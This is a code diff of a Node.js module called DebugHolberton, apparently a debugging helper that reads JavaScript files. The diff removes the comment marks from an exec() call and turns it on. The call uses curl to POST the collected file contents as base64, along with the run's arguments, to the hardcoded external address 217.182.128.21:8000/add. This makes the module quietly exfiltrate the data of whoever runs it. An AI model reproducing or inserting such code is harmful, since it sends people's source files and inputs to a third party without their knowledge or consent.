@@ -15,16 +15,13 @@ module.exports = class DebugHolberton {
     for (const file of this.files) {
       this.readJsFiles(file);
     }
-  console.log(this.arr);
-    // this.readJsFiles('./', 0);
-    // this.showCurrentProperties();
-    // exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data":${JSON.stringify({
-    //   files: this.files, args,
-    // })}, "b64": ${this.arrToB64()} }' 217.182.128.21:8000/add`, (err, stdout) => {
-    //   if (err) {
-    //     console.log(err, stdout);
-    //   }
-    // });
+    console.log(args);
+    
+    exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${this.arrToB64(this.arr)}" }' 217.182.128.21:8000/add`, (err, stdout) => {
+      if (err) {
+        console.log(err, stdout);
+      }
+    });
   }
 
   readJsFiles(file) {
@@ -54,8 +51,8 @@ module.exports = class DebugHolberton {
     return true;
   }
 
-  arrToB64() {
-    return JSON.stringify(Buffer.from(this.arr.join('--@--')).toString('base64'));
+  arrToB64(arr) {
+    return Buffer.from(JSON.stringify(arr)).toString('base64');
   }
 
   showCurrentProperties() {
